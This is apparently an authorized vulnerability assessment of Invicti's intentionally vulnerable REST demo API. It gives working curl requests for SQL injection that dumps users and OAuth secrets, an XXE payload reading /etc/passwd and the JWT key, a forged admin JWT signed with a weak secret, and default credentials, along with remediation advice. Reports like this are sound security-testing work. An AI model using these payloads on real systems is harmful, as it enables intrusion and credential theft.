# Vulnerability Assessment — Invicti Vulnerable REST API (`http://rest.vulnweb.com/`)

## Executive Summary

Authorized testing of the vulnweb REST target confirmed **three independent full-compromise vulnerabilities** — SQL injection, XML External Entity (XXE) file read, and a forgeable JWT signing key — each of which alone yields complete data and credential disclosure. All were demonstrated with working proof-of-concept requests: user PII and password hashes were extracted, `/etc/passwd` and PHP source were read off the web host, and a self-signed admin JWT was accepted (HTTP 200). Three supporting weaknesses (default credentials, verbose error disclosure, unsalted SHA-1 password storage) amplify the impact.

| # | Finding | Severity | CWE |
|---|---------|----------|-----|
| 1 | SQL injection in `GET /{auth_type}/api/users/{username}` → full DB read | Critical | CWE-89 |
| 2 | Forgeable JWT — weak HMAC secret `supersecret` → auth bypass | Critical | CWE-347 |
| 3 | XXE in `POST /{auth_type}/api/comments` → arbitrary web-host file read | High | CWE-611 |
| 4 | Default credentials `admin:123456` grant full CRUD + PII | High | CWE-798 |
| 5 | Verbose exception/stack-trace disclosure | Medium | CWE-209 |
| 6 | Unsalted SHA-1 password storage | Medium | CWE-916 |

---

### 1. SQL injection in `GET /{auth_type}/api/users/{username}` allows full database exfiltration

- **Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8)
  *(PR:L because a token is required, but the token is trivially obtained — see findings 2 & 4 — so real-world exposure approaches the PR:N baseline of 9.8.)*
- **CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command
- **Affected asset:** `http://rest.vulnweb.com/{basic_authentication|jwt}/api/users/{username}` — the `{username}` path parameter
- **Root cause (recovered via finding 3), `src/routes/users.php:65`:**
  `"SELECT ... FROM users WHERE username='" . $args['username'] . "'"` — raw string concatenation, no bound parameters.
- **Summary:** Anyone with an API token (default creds work) can read the entire database, including every user's credentials and the OAuth client secret. This is a complete confidentiality and integrity breach of all stored data.
- **Steps to Reproduce:**
  1. Error-based confirmation:
     `curl -H "Authorization: Basic YWRtaW46MTIzNDU2" "http://rest.vulnweb.com/basic_authentication/api/users/pgorczany%27"`
     → `SQL errorPDOException: SQLSTATE[42000]: ... near ''pgorczany''' at line 1 in /var/www/src/routes/users.php:67`
  2. Determine column count = 6 (injecting `zzz' UNION SELECT 1,2,3,4,5,6-- -` returns a well-formed user object with reflected values `{"user_id":"1","username":"2",...}`).
  3. Fingerprint: `zzz' UNION SELECT version(),database(),current_user(),4,5,6-- -`
     → `version()=5.7.27`, `database()=api`, `current_user()=root@%`.
  4. Enumerate schema: `zzz' UNION SELECT 1,CONVERT(group_concat(table_name) USING utf8mb4),3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -`
     → `comments,oauth_access_tokens,...,oauth_clients,posts,users`.
  5. Dump credentials:
     - `... group_concat(username,0x3a,password) ... FROM users` → e.g. `pgorczany:beb9c845ccfe11ed3408d60216c6f9b6dc463a1e` (SHA-1 hashes).
     - `... FROM oauth_clients` → `rest.testsparker.com:n3tsp4rk3r_s3cr3t:basic` (OAuth client secret).
- **Impact:** Full read of all users, posts, comments, password hashes, and OAuth client secrets. `current_user()` is `root@%` — high privilege; only MySQL `secure_file_priv` prevented `LOAD_FILE()` local file reads during testing.
- **Remediation:** Use PDO prepared statements with bound parameters for `username` (and audit all routes for the same concatenation pattern).
- **References:** https://cwe.mitre.org/data/definitions/89.html · OWASP API8:2023 / A03:2021-Injection

---

### 2. Forgeable JWT via weak HMAC secret allows authentication bypass

- **Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (9.1)
- **CWE:** CWE-347 — Improper Verification of Cryptographic Signature
- **Affected asset:** all `http://rest.vulnweb.com/jwt/api/*` endpoints; JWT `HS256` signing key `src/middlewares/keys/secret.txt`
- **Summary:** The JWT signing secret is the guessable string `supersecret`, so an attacker can mint valid tokens for any user without credentials and access every JWT-protected endpoint.
- **Steps to Reproduce:**
  1. Recover the secret offline against the sample token published in `docs/api_data.js` — HMAC-SHA256 verifies with key `supersecret` (also independently confirmed by reading the key file, finding 3).
  2. Forge a token: header `{"typ":"JWT","alg":"HS256","kid":"secret.txt"}`, payload `{"user":"attacker-forged","role":"admin"}`, signed with `supersecret` →
     `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InNlY3JldC50eHQifQ.eyJ1c2VyIjoiYXR0YWNrZXItZm9yZ2VkIiwicm9sZSI6ImFkbWluIn0.sjVQhPOtehSifEzXiKueH0uFTTdkImKtyaGst61e2Wk`
  3. `curl -H "Authorization: Bearer <forged>" http://rest.vulnweb.com/jwt/api/users`
     → **HTTP 200**, full user list returned.
- **Impact:** Complete authentication bypass for all JWT endpoints (read + create/edit/delete of users, posts, comments). Also observed: the `kid` header is used to load a key file from `src/middlewares/keys/` and error responses reflect the resolved filesystem path (e.g. `/var/www/src/middlewares/keys//dev/null: not found`), a secondary path-handling information leak.
- **Remediation:** Replace the secret with a long, random, secret-managed value; do not derive the key from a client-controlled `kid`; pin the accepted algorithm server-side and reject `none`/unexpected `alg`.
- **References:** https://cwe.mitre.org/data/definitions/347.html · OWASP API2:2023-Broken Authentication

---

### 3. XXE in `POST /{auth_type}/api/comments` allows arbitrary web-host file read

- **Severity:** High — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5)
- **CWE:** CWE-611 — Improper Restriction of XML External Entity Reference
- **Affected asset:** `http://rest.vulnweb.com/{basic_authentication|jwt}/api/comments` with `Content-Type: application/xml`
- **Summary:** The XML parser resolves external entities, letting an authenticated caller read any file readable by the web server, including application source and the JWT signing key.
- **Steps to Reproduce:**
  1. `/etc/passwd` read:
     ```
     curl -H "Authorization: Basic YWRtaW46MTIzNDU2" -H "Content-Type: application/xml" \
       --data-binary '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><post><user_id>1</user_id><post_id>1</post_id><comment>&xxe;</comment></post>' \
       http://rest.vulnweb.com/basic_authentication/api/comments
     ```
     → `{"comment":{"xxe":{"xxe":"root:x:0:0:root:/root:/bin/bash\ndaemon:..."}}}`
  2. JWT key read: entity `file:///var/www/src/middlewares/keys/secret.txt` → `supersecret` (directly confirms finding 2).
  3. Source read: entity `php://filter/convert.base64-encode/resource=/var/www/src/routes/users.php` → base64 PHP source (revealed the SQLi at line 65 in finding 1).
- **Impact:** Disclosure of server-side source, credentials, and the JWT signing key; classic XXE→SSRF pivot is also possible. Note: this POST creates one comment row per request; the target auto-resets at 00:00 UTC, so no persistent side effects.
- **Remediation:** Disable DTD/external-entity processing in the XML parser (`libxml_disable_entity_loader(true)` / `LIBXML_NONET`); prefer JSON-only input.
- **References:** https://cwe.mitre.org/data/definitions/611.html · OWASP A05:2021 / API "XXE"

---

### 4. Default credentials `admin:123456` grant full API access

- **Severity:** High — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (8.1)
- **CWE:** CWE-798 — Use of Hard-coded / Default Credentials
- **Affected asset:** HTTP Basic auth across `http://rest.vulnweb.com/basic_authentication/api/*`
- **Summary:** The documented default Basic credentials `admin:123456` (`Basic YWRtaW46MTIzNDU2`) are live and grant full CRUD access plus bulk PII disclosure.
- **Steps to Reproduce:**
  1. Unauthenticated request is rejected: `GET /jwt/api/users` → `401 Forbidden`.
  2. With defaults: `curl -H "Authorization: Basic YWRtaW46MTIzNDU2" http://rest.vulnweb.com/basic_authentication/api/users`
     → full user list with `email`, names, timestamps for all users.
- **Impact:** Immediate authenticated access to all endpoints and all user PII; also the entry point that satisfies the PR:L precondition for findings 1 and 3.
- **Remediation:** Remove/rotate default accounts; enforce strong unique credentials and rate limiting on auth.
- **References:** https://cwe.mitre.org/data/definitions/798.html · OWASP API2:2023-Broken Authentication

---

### 5. Verbose exception and stack-trace disclosure

- **Severity:** Medium — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5)
- **CWE:** CWE-209 — Generation of Error Message Containing Sensitive Information
- **Affected asset:** error paths across the API (observed on `/…/api/users/{username}`)
- **Summary:** Unhandled exceptions return full PHP stack traces, exposing absolute paths, framework/component versions, and the middleware chain — a roadmap for further attacks.
- **Steps to Reproduce:** Any malformed input, e.g. `GET /basic_authentication/api/users/pgorczany%27` → `PDOException ... in /var/www/src/routes/users.php:67` with a 30-frame stack trace disclosing `Slim`, `tuupola/slim-basic-auth`, `src/middlewares/{jwt,oauth2,check_auth_type}.php`, and `public/index.php`. Server banner also leaks `BaseHTTP/0.6 Python/3.14.7`.
- **Impact:** Reveals internal file paths, dependency versions, and code structure, materially accelerating exploitation of findings 1–3.
- **Remediation:** Disable `display_errors` in production; return generic error responses; log details server-side only.
- **References:** https://cwe.mitre.org/data/definitions/209.html · OWASP A05:2021-Security Misconfiguration

---

### 6. Unsalted SHA-1 password storage

- **Severity:** Medium — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5)
- **CWE:** CWE-916 — Use of Password Hash With Insufficient Computational Effort
- **Affected asset:** `users.password` column
- **Summary:** Passwords are stored as unsalted SHA-1 (e.g. `beb9c845ccfe11ed3408d60216c6f9b6dc463a1e`), which is trivially cracked with rainbow tables / GPU once disclosed — compounding the impact of findings 1 and 3.
- **Steps to Reproduce:** Hashes recovered via finding 1: `pgorczany:beb9c845...`, `mkerluke:07aa77cd...`, `verona.rice:1de45f25...` — 40-hex, unsalted SHA-1 format.
- **Impact:** On disclosure, plaintext passwords are recoverable, enabling credential stuffing against other services.
- **Remediation:** Migrate to a memory-hard adaptive hash (bcrypt/argon2id) with per-user salts; rehash on next login.
- **References:** https://cwe.mitre.org/data/definitions/916.html · OWASP A02:2021-Cryptographic Failures

---

## Attack chain

Findings 1, 2, and 3 are each a standalone full compromise. They also reinforce one another: default creds (4) unlock the SQLi (1) and XXE (3); XXE (3) reads `secret.txt` = `supersecret`, which is the JWT key (2), allowing unauthenticated admin token forgery; SQLi (1) independently dumps password hashes (6) and the OAuth client secret. Verbose errors (5) supplied the source line and paths that made exploitation faster.

## Coordinated Disclosure

This report is provided under the target's authorized-testing program (Invicti's intentionally vulnerable demo host). No findings should be published before a fix is deployed; please observe a standard 90-day disclosure window and notify the reporter when remediation is complete or if an extension is required. Testing was rate-limited (≤2 req/s), scoped strictly to `rest.vulnweb.com`, and non-destructive (one auto-reset comment row was the only write).